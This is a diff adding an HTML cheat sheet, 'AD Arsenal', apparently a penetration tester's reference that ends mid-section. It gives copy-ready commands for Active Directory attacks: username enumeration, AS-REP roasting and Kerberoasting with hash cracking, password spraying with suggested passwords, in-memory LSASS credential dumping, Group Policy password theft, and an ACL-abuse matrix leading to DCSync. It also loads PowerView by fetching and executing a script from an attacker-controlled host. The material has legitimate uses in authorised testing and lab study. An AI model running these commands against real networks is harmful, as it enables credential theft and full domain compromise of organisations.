@@ -1,0 +1,1625 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AD Arsenal — @ethicalsoup</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:      #0a0c0f;
+    --bg2:     #0f1215;
+    --bg3:     #141820;
+    --border:  #1e2530;
+    --accent:  #00d4aa;
+    --accent2: #ff6b35;
+    --accent4: #f7c948;
+    --dim:     #3a4555;
+    --text:    #c8d4e0;
+    --textd:   #5a6a7a;
+    --green:   #4ec94e;
+    --red:     #ff4d6a;
+    --blue:    #4d9fff;
+    --purple:  #b06aff;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.6}
+  body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,212,170,.012) 2px,rgba(0,212,170,.012) 4px);pointer-events:none;z-index:1000}
+  .wrap{max-width:1400px;margin:0 auto;padding:32px 24px 80px}
+
+  /* HEADER */
+  header{padding-bottom:28px;border-bottom:1px solid var(--border);margin-bottom:40px}
+  .tl{font-family:'Syne',sans-serif;font-size:11px;font-weight:700;letter-spacing:.2em;text-transform:uppercase;color:var(--accent);margin-bottom:8px}
+  h1{font-family:'Syne',sans-serif;font-size:2.6em;font-weight:800;color:#fff;line-height:1.1;letter-spacing:-.02em}
+  h1 span{color:var(--accent)}
+  .meta{margin-top:12px;font-size:11px;color:var(--textd)}
+  .meta b{color:var(--accent2)}
+
+  /* NAV */
+  .nav{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:40px}
+  .nav a{display:inline-block;padding:5px 12px;border:1px solid var(--border);border-radius:4px;color:var(--textd);font-size:10px;letter-spacing:.08em;text-decoration:none;text-transform:uppercase;transition:all .15s}
+  .nav a:hover,.nav a.active{border-color:var(--accent);color:var(--accent)}
+
+  /* PHASE HEADER */
+  .phase{font-family:'Syne',sans-serif;font-size:10px;font-weight:700;letter-spacing:.2em;text-transform:uppercase;color:var(--textd);margin:40px 0 14px;display:flex;align-items:center;gap:10px}
+  .phase::after{content:'';flex:1;height:1px;background:var(--border)}
+  .phase-num{color:var(--accent);margin-right:4px}
+
+  /* GRID */
+  .g2{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+  .g3{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+  .g4{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+  .s2{grid-column:span 2}
+  .s3{grid-column:span 3}
+  .s4{grid-column:span 4}
+
+  /* CARD */
+  .card{background:var(--bg2);border:1px solid var(--border);border-radius:6px;overflow:hidden;transition:border-color .2s}
+  .card:hover{border-color:var(--dim)}
+  .ch{display:flex;align-items:center;justify-content:space-between;padding:9px 14px;background:var(--bg3);border-bottom:1px solid var(--border)}
+  .ct{font-family:'Syne',sans-serif;font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:#fff}
+  .tag{font-size:10px;padding:2px 8px;border-radius:3px;letter-spacing:.05em;white-space:nowrap}
+  .tc{background:rgba(255,77,106,.15);color:var(--red);border:1px solid rgba(255,77,106,.3)}
+  .th{background:rgba(255,107,53,.15);color:var(--accent2);border:1px solid rgba(255,107,53,.3)}
+  .tm{background:rgba(247,201,72,.12);color:var(--accent4);border:1px solid rgba(247,201,72,.25)}
+  .ti{background:rgba(0,212,170,.10);color:var(--accent);border:1px solid rgba(0,212,170,.2)}
+  .tu{background:rgba(77,159,255,.10);color:var(--blue);border:1px solid rgba(77,159,255,.2)}
+  .tp{background:rgba(176,106,255,.10);color:var(--purple);border:1px solid rgba(176,106,255,.2)}
+
+  .cb{padding:12px 14px}
+  .cd{font-size:11px;color:var(--textd);margin-bottom:5px;margin-top:8px}
+  .cd:first-child{margin-top:0}
+
+  /* CODE */
+  .code-block{background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:9px 11px;margin-bottom:7px;position:relative;overflow-x:auto}
+  .code-block:last-child{margin-bottom:0}
+  .code-block pre{font-family:'JetBrains Mono',monospace;font-size:11.5px;line-height:1.65;white-space:pre;color:var(--text)}
+  .kw{color:#c792ea}.str{color:#c3e88d}.num{color:#f78c6c}
+  .cmt{color:var(--textd);font-style:italic}.fn{color:#82aaff}
+  .cls{color:#ffcb6b}.op{color:var(--accent)}.ph{color:var(--accent2)}
+  .ok{color:var(--green)}.no{color:var(--red)}
+
+  .copy-btn{position:absolute;top:5px;right:7px;background:var(--bg3);border:1px solid var(--border);color:var(--textd);font-family:'JetBrains Mono',monospace;font-size:9px;padding:2px 6px;border-radius:3px;cursor:pointer;transition:all .15s;letter-spacing:.05em}
+  .copy-btn:hover{border-color:var(--accent);color:var(--accent)}
+  .copy-btn.copied{border-color:var(--green);color:var(--green)}
+
+  /* BOXES */
+  .gotcha{margin-top:8px;padding:7px 11px;background:rgba(255,77,106,.07);border:1px solid rgba(255,77,106,.2);border-left:3px solid var(--red);border-radius:0 4px 4px 0;font-size:11px;color:#e0a0a8;line-height:1.5}
+  .gotcha strong{color:var(--red)}
+  .tip{margin-top:8px;padding:7px 11px;background:rgba(0,212,170,.06);border:1px solid rgba(0,212,170,.2);border-left:3px solid var(--accent);border-radius:0 4px 4px 0;font-size:11px;color:#90d4c8;line-height:1.5}
+  .tip strong{color:var(--accent)}
+  .warn{margin-top:8px;padding:7px 11px;background:rgba(247,201,72,.07);border:1px solid rgba(247,201,72,.2);border-left:3px solid var(--accent4);border-radius:0 4px 4px 0;font-size:11px;color:#d4c890;line-height:1.5}
+  .warn strong{color:var(--accent4)}
+
+  /* FLOW TABLE */
+  .ft{width:100%;border-collapse:collapse;font-size:11.5px}
+  .ft th{text-align:left;padding:7px 11px;background:var(--bg3);color:var(--textd);font-weight:400;letter-spacing:.05em;border-bottom:1px solid var(--border)}
+  .ft td{padding:7px 11px;border-bottom:1px solid rgba(30,37,48,.6);vertical-align:top}
+  .ft tr:last-child td{border-bottom:none}
+  .ft .sn{color:var(--accent);font-weight:700;width:28px;text-align:center}
+  .ft .cat{color:var(--accent4);font-size:10px;letter-spacing:.05em}
+  .ft code{background:var(--bg);padding:2px 6px;border-radius:3px;color:var(--green);font-size:10.5px}
+  .ft .hit{color:var(--accent2);font-weight:700}
+
+  /* DECISION TREE */
+  .dtree{font-size:12px;line-height:1.9}
+  .dtree .q{color:var(--accent4);font-weight:700}
+  .dtree .a{color:var(--text);padding-left:16px}
+  .dtree .action{color:var(--green);padding-left:32px}
+  .dtree .no-action{color:var(--red);padding-left:32px}
+
+  /* ACL MATRIX */
+  .acl-edge{display:inline-block;padding:1px 7px;border-radius:3px;font-size:10px;font-weight:700;letter-spacing:.04em}
+  .ae-crit{background:rgba(255,77,106,.18);color:var(--red);border:1px solid rgba(255,77,106,.35)}
+  .ae-high{background:rgba(255,107,53,.15);color:var(--accent2);border:1px solid rgba(255,107,53,.3)}
+  .ae-med{background:rgba(247,201,72,.12);color:var(--accent4);border:1px solid rgba(247,201,72,.25)}
+
+  footer{margin-top:60px;padding-top:20px;border-top:1px solid var(--border);display:flex;justify-content:space-between;color:var(--textd);font-size:10px;letter-spacing:.05em}
+
+  @media(max-width:900px){.g2,.g3,.g4{grid-template-columns:1fr}.s2,.s3,.s4{grid-column:span 1}h1{font-size:1.8em}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header>
+  <div class="tl">// Active Directory Attack Arsenal</div>
+  <h1>AD <span>Arsenal</span></h1>
+  <div class="meta" style="margin-top:10px">
+    Companion to Pentest Field Guide &middot; Covers unauthenticated enum → coercion/relay → ACL chains → delegation → ADCS → post-compromise persistence<br>
+    <b>Living document</b> — updated as new techniques and gotchas are discovered. HTB POO &middot; Fluffy &middot; Tombwatcher &middot; Pro Labs
+  </div>
+</header>
+
+<nav class="nav">
+  <a href="#unauth">01 Unauthenticated</a>
+  <a href="#initial-creds">02 Initial Creds</a>
+  <a href="#authed-enum">03 Auth Enum</a>
+  <a href="#acl">04 ACL Abuse</a>
+  <a href="#delegation">05 Delegation</a>
+  <a href="#coercion">06 Coercion+Relay</a>
+  <a href="#adcs">07 ADCS</a>
+  <a href="#shadow-creds">08 Shadow Creds</a>
+  <a href="#tickets">09 Tickets</a>
+  <a href="#dcsync">10 DCSync</a>
+  <a href="#persistence">11 Persistence</a>
+  <a href="#cross-trust">12 Cross-Trust</a>
+</nav>
+
+<!-- ══════════════════════════════════════════════════════ -->
+<div id="unauth" class="phase"><span class="phase-num">01</span>Unauthenticated Enumeration</div>
+
+<div class="g2">
+
+  <div class="card">
+    <div class="ch"><span class="ct">LDAP Anonymous Bind</span><span class="tag th">HIGH VALUE — often overlooked</span></div>
+    <div class="cb">
+      <div class="cd">Test anonymous bind first — reveals domain base, naming contexts</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Check if anon bind allowed — get naming context</span>
+ldapsearch -x -H ldap://<span class="ph">DC_IP</span> -b "" -s base namingContexts
+
+<span class="cmt"># Enumerate all users anonymously</span>
+ldapsearch -x -H ldap://<span class="ph">DC_IP</span> \
+  -b "DC=<span class="ph">domain</span>,DC=<span class="ph">local</span>" \
+  "(objectClass=user)" sAMAccountName userPrincipalName memberOf
+
+<span class="cmt"># Enumerate groups</span>
+ldapsearch -x -H ldap://<span class="ph">DC_IP</span> \
+  -b "DC=<span class="ph">domain</span>,DC=<span class="ph">local</span>" \
+  "(objectClass=group)" cn member
+
+<span class="cmt"># Enumerate all objects (broad sweep)</span>
+ldapsearch -x -H ldap://<span class="ph">DC_IP</span> \
+  -b "DC=<span class="ph">domain</span>,DC=<span class="ph">local</span>" \
+  "(objectClass=*)" dn | grep "^dn:"</pre>
+      </div>
+
+      <div class="cd">windapsearch — cleaner anonymous queries</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># No credentials needed for anon</span>
+windapsearch -d <span class="ph">domain.local</span> --dc <span class="ph">DC_IP</span> -m users
+windapsearch -d <span class="ph">domain.local</span> --dc <span class="ph">DC_IP</span> -m groups
+windapsearch -d <span class="ph">domain.local</span> --dc <span class="ph">DC_IP</span> -m computers</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">SMB Null Session + RPC</span><span class="tag th">HIGH VALUE</span></div>
+    <div class="cb">
+      <div class="cd">SMB null session enumeration</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># List shares — null session</span>
+smbclient -L //<span class="ph">DC_IP</span> -N
+nxc smb <span class="ph">DC_IP</span> --shares -u '' -p ''
+
+<span class="cmt"># Enum4linux-ng — comprehensive (users, shares, groups, policies)</span>
+enum4linux-ng -A <span class="ph">DC_IP</span>
+
+<span class="cmt"># RPC null session — user enum</span>
+rpcclient -U "" -N <span class="ph">DC_IP</span>
+  rpcclient $> enumdomusers
+  rpcclient $> enumdomgroups
+  rpcclient $> querydominfo
+  rpcclient $> getdompwinfo      <span class="cmt"># password policy — lockout threshold!</span>
+  rpcclient $> lookupnames administrator</pre>
+      </div>
+
+      <div class="cd">Password policy — CRITICAL before spraying</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Get lockout policy before ANY credential attacks</span>
+nxc smb <span class="ph">DC_IP</span> -u '' -p '' --pass-pol
+enum4linux-ng -P <span class="ph">DC_IP</span>
+crackmapexec smb <span class="ph">DC_IP</span> --pass-pol</pre>
+      </div>
+
+      <div class="warn"><strong>CRITICAL:</strong> Always query password policy before spraying. Law firm environments typically enforce 3-attempt lockout with 30-min observation window. Prefer offline attacks (Kerberoast, AS-REP) over spray when lockout &lt; 5.</div>
+    </div>
+  </div>
+
+</div>
+
+<div class="g2" style="margin-top:14px">
+
+  <div class="card">
+    <div class="ch"><span class="ct">Kerbrute — Username Enumeration (No Creds)</span><span class="tag tc">CRITICAL — pre-spray</span></div>
+    <div class="cb">
+      <div class="cd">Username enum via Kerberos pre-auth — does NOT trigger lockout</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Enumerate valid usernames — no lockout risk</span>
+kerbrute userenum \
+  --dc <span class="ph">DC_IP</span> -d <span class="ph">domain.local</span> \
+  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+<span class="cmt"># With custom list (common AD patterns)</span>
+kerbrute userenum \
+  --dc <span class="ph">DC_IP</span> -d <span class="ph">domain.local</span> \
+  users.txt -o valid_users.txt
+
+<span class="cmt"># Generate username list from names found in LDAP/SMB</span>
+<span class="cmt"># Tools: namemash.py, username-anarchy</span>
+python3 namemash.py names.txt > users.txt
+username-anarchy -i full_names.txt > users.txt</pre>
+      </div>
+
+      <div class="tip"><strong>KEY:</strong> Kerbrute userenum is safe — PREAUTH_REQUIRED response = valid user. PRINCIPAL_UNKNOWN = invalid. No password attempted, no lockout counter incremented.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">AS-REP Roasting (No Auth Required)</span><span class="tag tc">CRITICAL — lockout-safe</span></div>
+    <div class="cb">
+      <div class="cd">Target accounts with "Do not require Kerberos preauthentication" set</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># From Linux — impacket (no creds, just userlist)</span>
+GetNPUsers.py <span class="ph">domain.local</span>/ \
+  -dc-ip <span class="ph">DC_IP</span> \
+  -usersfile valid_users.txt \
+  -format hashcat \
+  -outputfile asrep_hashes.txt
+
+<span class="cmt"># With valid creds — enumerate ALL AS-REP-able accounts</span>
+GetNPUsers.py <span class="ph">domain.local</span>/<span class="ph">user</span>:'<span class="ph">pass</span>' \
+  -dc-ip <span class="ph">DC_IP</span> -request -format hashcat
+
+<span class="cmt"># Crack with hashcat — mode 18200</span>
+hashcat -m 18200 asrep_hashes.txt \
+  /opt/wordlists/rockyou2021.txt \
+  -r /opt/rules/rockyou-30000.rule
+
+<span class="cmt"># With netexec</span>
+nxc ldap <span class="ph">DC_IP</span> -u <span class="ph">user</span> -p '<span class="ph">pass</span>' --asreproast asrep.txt</pre>
+      </div>
+
+      <div class="gotcha"><strong>GOTCHA:</strong> Without a userlist, you need to guess names. Build the list from Kerbrute enum, LDAP anon, SMB, or OSINT first. hashcat <code>--username</code> flag required if file format is <code>user:hash</code>.</div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════════════ -->
+<div id="initial-creds" class="phase"><span class="phase-num">02</span>Initial Credential Attacks</div>
+
+<div class="g2">
+
+  <div class="card">
+    <div class="ch"><span class="ct">Password Spraying — Lockout-Aware</span><span class="tag tc">EXTREME CAUTION — 3-attempt envs</span></div>
+    <div class="cb">
+      <div class="cd">Only spray after: policy retrieved, userlist validated, lockout &gt;= 5</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Kerbrute spray — Kerberos protocol (stealth)</span>
+kerbrute passwordspray \
+  --dc <span class="ph">DC_IP</span> -d <span class="ph">domain.local</span> \
+  valid_users.txt '<span class="ph">Password123!</span>'
+
+<span class="cmt"># NetExec spray — SMB</span>
+nxc smb <span class="ph">DC_IP</span> -u valid_users.txt -p '<span class="ph">Password123!</span>' \
+  --continue-on-success --no-bruteforce
+
+<span class="cmt"># NetExec spray — LDAP (quieter than SMB)</span>
+nxc ldap <span class="ph">DC_IP</span> -u valid_users.txt -p passwords.txt \
+  --continue-on-success --no-bruteforce
+
+<span class="cmt"># Smart spray candidates (seasonal + company name)</span>
+<span class="cmt">  Season+Year: Spring2024!, Summer2024!, Winter2025!</span>
+<span class="cmt">  Company+Year: CompanyName2024!</span>
+<span class="cmt">  Welcome pattern: Welcome1!, Welcome123</span>
+<span class="cmt">  Common: P@ssw0rd, Passw0rd!, Password1</span></pre>
+      </div>
+
+      <div class="warn"><strong>SPRAY DISCIPLINE:</strong> One password per spray round. Wait full observation window (typically 30 min) between rounds. Track attempt count per user. In 3-attempt envs — DO NOT SPRAY. Use Kerberoasting / AS-REP only.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">Kerberoasting — SPN Account Targeting</span><span class="tag tc">CRITICAL — no lockout risk</span></div>
+    <div class="cb">
+      <div class="cd">Any authenticated user can request service tickets — no special rights needed</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># impacket — dump all kerberoastable accounts</span>
+GetUserSPNs.py <span class="ph">domain.local</span>/<span class="ph">user</span>:'<span class="ph">pass</span>' \
+  -dc-ip <span class="ph">DC_IP</span> -request \
+  -outputfile kerb_hashes.txt
+
+<span class="cmt"># With hash instead of password</span>
+GetUserSPNs.py <span class="ph">domain.local</span>/<span class="ph">user</span> \
+  -hashes :<span class="ph">NTHASH</span> \
+  -dc-ip <span class="ph">DC_IP</span> -request
+
+<span class="cmt"># NetExec kerberoast</span>
+nxc ldap <span class="ph">DC_IP</span> -u <span class="ph">user</span> -p '<span class="ph">pass</span>' --kerberoasting kerb.txt
+
+<span class="cmt"># Crack — hashcat mode 13100</span>
+hashcat -m 13100 kerb_hashes.txt \
+  /opt/wordlists/rockyou2021.txt \
+  -r /opt/rules/rockyou-30000.rule
+
+<span class="cmt"># Rubeus from Windows (targeted — RC4 downgrade for easier crack)</span>
+Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:kerb.txt</pre>
+      </div>
+
+      <div class="tip"><strong>OPSEC:</strong> Request RC4 tickets (downgrade from AES) — faster to crack. Use <code>/tgtdeleg</code> in Rubeus. High-value targets: service accounts named svc_*, sql_*, web_*, iis_*, backup_*.</div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════════════ -->
+<div id="authed-enum" class="phase"><span class="phase-num">03</span>Authenticated Enumeration</div>
+
+<div class="g2">
+
+  <div class="card">
+    <div class="ch"><span class="ct">BloodHound Collection + Key Queries</span><span class="tag tc">CRITICAL — run immediately on foothold</span></div>
+    <div class="cb">
+      <div class="cd">Collection (Linux preferred — no AV interaction)</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># bloodhound-python — all collection methods</span>
+bloodhound-python -u <span class="ph">user</span> -p '<span class="ph">pass</span>' \
+  -d <span class="ph">domain.local</span> -dc <span class="ph">DC_FQDN</span> \
+  -ns <span class="ph">DC_IP</span> -c All --zip
+
+<span class="cmt"># With hash (PTH)</span>
+bloodhound-python -u <span class="ph">user</span> \
+  --hashes :<span class="ph">NTHASH</span> \
+  -d <span class="ph">domain.local</span> -dc <span class="ph">DC_FQDN</span> \
+  -ns <span class="ph">DC_IP</span> -c All
+
+<span class="cmt"># SharpHound (from Windows target)</span>
+.\SharpHound.exe -c All --zipfilename bh.zip
+.\SharpHound.exe -c All,GPOLocalGroup --loop</pre>
+      </div>
+
+      <div class="cd">Key Cypher queries — run after import</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Find all paths from owned user to DA</span>
+MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
+
+<span class="cmt"># All kerberoastable accounts</span>
+MATCH (u:User {hasspn:true}) RETURN u.name, u.description
+
+<span class="cmt"># AS-REP-roastable accounts</span>
+MATCH (u:User {dontreqpreauth:true}) RETURN u.name
+
+<span class="cmt"># Users with unconstrained delegation</span>
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
+
+<span class="cmt"># Find computers where owned users have admin rights</span>
+MATCH p=(u:User {owned:true})-[:AdminTo]->(c:Computer) RETURN p
+
+<span class="cmt"># Find all ADCS ESC paths</span>
+MATCH p=()-[:Enroll|GenericAll|GenericWrite]->(ct:CertTemplate) RETURN p</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">PowerView — Manual AD Enum</span><span class="tag th">HIGH VALUE — targeted queries</span></div>
+    <div class="cb">
+      <div class="cd">Domain info + user/group enum</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Import (bypass AMSI first if needed)</span>
+IEX (New-Object Net.WebClient).DownloadString('http://<span class="ph">KALI</span>/PowerView.ps1')
+
+<span class="cmt"># Domain info</span>
+Get-Domain
+Get-DomainController
+Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
+
+<span class="cmt"># Users</span>
+Get-DomainUser | Select-Object samaccountname,description,memberof,pwdlastset
+Get-DomainUser -AdminCount         <span class="cmt"># AdminSDHolder protected users</span>
+Get-DomainUser -SPN                <span class="cmt"># Kerberoastable</span>
+Get-DomainUser -PreauthNotRequired <span class="cmt"># AS-REP roastable</span>
+
+<span class="cmt"># Groups</span>
+Get-DomainGroup | Where-Object {$_.GroupScope -eq "Universal"}
+Get-DomainGroupMember "Domain Admins" -Recurse
+
+<span class="cmt"># Computers</span>
+Get-DomainComputer | Select-Object dnshostname,operatingsystem
+Get-DomainComputer -Unconstrained   <span class="cmt"># Unconstrained delegation hosts</span>
+Get-DomainComputer -TrustedToAuth   <span class="cmt"># Constrained delegation hosts</span></pre>
+      </div>
+
+      <div class="cd">ACL enumeration (targeted)</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Find ACLs on a specific user</span>
+Get-DomainObjectAcl -Identity <span class="ph">targetuser</span> -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDACL|AllExtendedRights" }
+
+<span class="cmt"># Find ALL interesting ACEs (slow but thorough)</span>
+Find-InterestingDomainAcl -ResolveGUIDs |
+  Where-Object { $_.IdentityReferenceName -match "<span class="ph">owneduser</span>" }
+
+<span class="cmt"># ACLs on domain object (DCSync rights)</span>
+Get-DomainObjectAcl -Identity "DC=<span class="ph">domain</span>,DC=<span class="ph">local</span>" -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match "DS-Replication" }</pre>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<div class="g2" style="margin-top:14px">
+
+  <div class="card">
+    <div class="ch"><span class="ct">NetExec / CrackMapExec — Swiss Army Knife</span><span class="tag tm">WORKFLOW</span></div>
+    <div class="cb">
+      <div class="cd">Quick domain and host enumeration with creds</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Domain info</span>
+nxc ldap <span class="ph">DC_IP</span> -u <span class="ph">user</span> -p '<span class="ph">pass</span>' --get-dn
+nxc ldap <span class="ph">DC_IP</span> -u <span class="ph">user</span> -p '<span class="ph">pass</span>' --users
+nxc ldap <span class="ph">DC_IP</span> -u <span class="ph">user</span> -p '<span class="ph">pass</span>' --groups
+nxc ldap <span class="ph">DC_IP</span> -u <span class="ph">user</span> -p '<span class="ph">pass</span>' --computers
+
+<span class="cmt"># Local admin hunt (find where creds work as admin)</span>
+nxc smb <span class="ph">SUBNET/24</span> -u <span class="ph">user</span> -p '<span class="ph">pass</span>' --local-auth
+nxc smb <span class="ph">SUBNET/24</span> -u <span class="ph">user</span> -H <span class="ph">NTHASH</span> --local-auth
+
+<span class="cmt"># Logged-on users (find DA sessions)</span>
+nxc smb <span class="ph">SUBNET/24</span> -u <span class="ph">user</span> -p '<span class="ph">pass</span>' --loggedon-users
+
+<span class="cmt"># Share enumeration</span>
+nxc smb <span class="ph">SUBNET/24</span> -u <span class="ph">user</span> -p '<span class="ph">pass</span>' --shares
+
+<span class="cmt"># Module: lsassy (in-memory credential dump — no binary drop)</span>
+nxc smb <span class="ph">TARGET</span> -u <span class="ph">admin</span> -H <span class="ph">NTHASH</span> -M lsassy
+
+<span class="cmt"># Module: gpp_password (Group Policy creds)</span>
+nxc smb <span class="ph">DC_IP</span> -u <span class="ph">user</span> -p '<span class="ph">pass</span>' -M gpp_password</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">LDAP Queries — Impacket + Direct</span><span class="tag ti">SURGICAL ENUM</span></div>
+    <div class="cb">
+      <div class="cd">Targeted queries for specific attributes</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># All users with description field (often contains passwords)</span>
+ldapsearch -x -H ldap://<span class="ph">DC_IP</span> \
+  -D "<span class="ph">user</span>@<span class="ph">domain.local</span>" -w '<span class="ph">pass</span>' \
+  -b "DC=<span class="ph">domain</span>,DC=<span class="ph">local</span>" \
+  "(objectClass=user)" sAMAccountName description |
+  grep -A1 description
+
+<span class="cmt"># Accounts with password not required (PASSWD_NOTREQD flag)</span>
+ldapsearch -x -H ldap://<span class="ph">DC_IP</span> \
+  -D "<span class="ph">user</span>@<span class="ph">domain.local</span>" -w '<span class="ph">pass</span>' \
+  -b "DC=<span class="ph">domain</span>,DC=<span class="ph">local</span>" \
+  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" sAMAccountName
+
+<span class="cmt"># Machine account quota (default 10 — RBCD prerequisite)</span>
+ldapsearch -x -H ldap://<span class="ph">DC_IP</span> \
+  -D "<span class="ph">user</span>@<span class="ph">domain.local</span>" -w '<span class="ph">pass</span>' \
+  -b "DC=<span class="ph">domain</span>,DC=<span class="ph">local</span>" \
+  "(objectClass=domain)" ms-DS-MachineAccountQuota
+
+<span class="cmt"># AD CS — find Certificate Authorities</span>
+ldapsearch -x -H ldap://<span class="ph">DC_IP</span> \
+  -D "<span class="ph">user</span>@<span class="ph">domain.local</span>" -w '<span class="ph">pass</span>' \
+  -b "CN=Configuration,DC=<span class="ph">domain</span>,DC=<span class="ph">local</span>" \
+  "(objectClass=pKIEnrollmentService)" cn dNSHostName</pre>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════════════ -->
+<div id="acl" class="phase"><span class="phase-num">04</span>ACL Abuse — Edge Decision Matrix</div>
+
+<div class="g2">
+
+  <div class="card s2">
+    <div class="ch"><span class="ct">ACL Edge → Attack Matrix</span><span class="tag tc">CRITICAL — BloodHound path resolution</span></div>
+    <div class="cb">
+      <table class="ft">
+        <tr>
+          <th>BloodHound Edge</th>
+          <th>Target Object</th>
+          <th>Attack Technique</th>
+          <th>Tools</th>
+          <th>Result</th>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-crit">GenericAll</span></td>
+          <td>User</td>
+          <td>Shadow Credentials, ForceChangePassword, Add to group</td>
+          <td>certipy shadow, pywhisker, rpcclient</td>
+          <td>Compromise user</td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-crit">GenericAll</span></td>
+          <td>Group</td>
+          <td>Add self/arbitrary user to group</td>
+          <td>PowerView Add-DomainGroupMember, net group /domain</td>
+          <td>Group membership</td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-crit">GenericAll</span></td>
+          <td>Computer</td>
+          <td>RBCD — add controlled machine account to msDS-AllowedToActOnBehalfOf</td>
+          <td>impacket rbcd.py, PowerView</td>
+          <td>Admin on host</td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-high">GenericWrite</span></td>
+          <td>User</td>
+          <td>Shadow Credentials, SPN set → Kerberoast, scriptPath → logon exec</td>
+          <td>certipy shadow, pywhisker, Set-DomainObject</td>
+          <td>Compromise user</td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-high">GenericWrite</span></td>
+          <td>Computer</td>
+          <td>RBCD via msDS-AllowedToActOnBehalfOf write</td>
+          <td>rbcd.py, PowerView</td>
+          <td>Admin on host</td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-high">WriteDACL</span></td>
+          <td>User/Group/Domain</td>
+          <td>Grant yourself GenericAll → chain to above</td>
+          <td>Add-DomainObjectAcl</td>
+          <td>Escalate to GenericAll</td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-high">WriteOwner</span></td>
+          <td>Any</td>
+          <td>Take ownership → WriteDACL → GenericAll</td>
+          <td>Set-DomainObjectOwner, Add-DomainObjectAcl</td>
+          <td>Two-step escalation</td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-med">AllExtendedRights</span></td>
+          <td>User</td>
+          <td>ForceChangePassword without knowing current password</td>
+          <td>Set-DomainUserPassword, rpcclient setuserinfo2</td>
+          <td>Reset victim password</td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-med">AddSelf / AddMember</span></td>
+          <td>Group</td>
+          <td>Add yourself to group</td>
+          <td>Add-DomainGroupMember, net group /domain</td>
+          <td>Group membership</td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-med">DS-Replication</span></td>
+          <td>Domain</td>
+          <td>DCSync — dump all hashes</td>
+          <td>secretsdump.py, Mimikatz lsadump::dcsync</td>
+          <td>All domain creds</td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-crit">Owns</span></td>
+          <td>Any</td>
+          <td>Owner can grant WriteDACL → then GenericAll</td>
+          <td>Set-DomainObjectOwner → Add-DomainObjectAcl</td>
+          <td>Full object control</td>
+        </tr>
+      </table>
+    </div>
+  </div>
+
+</div>
+
+<div class="g2" style="margin-top:14px">
+
+  <div class="card">
+    <div class="ch"><span class="ct">ForceChangePassword / Add to Group</span><span class="tag th">HIGH VALUE</span></div>
+    <div class="cb">
+      <div class="cd">ForceChangePassword — AllExtendedRights or GenericAll on user</div>
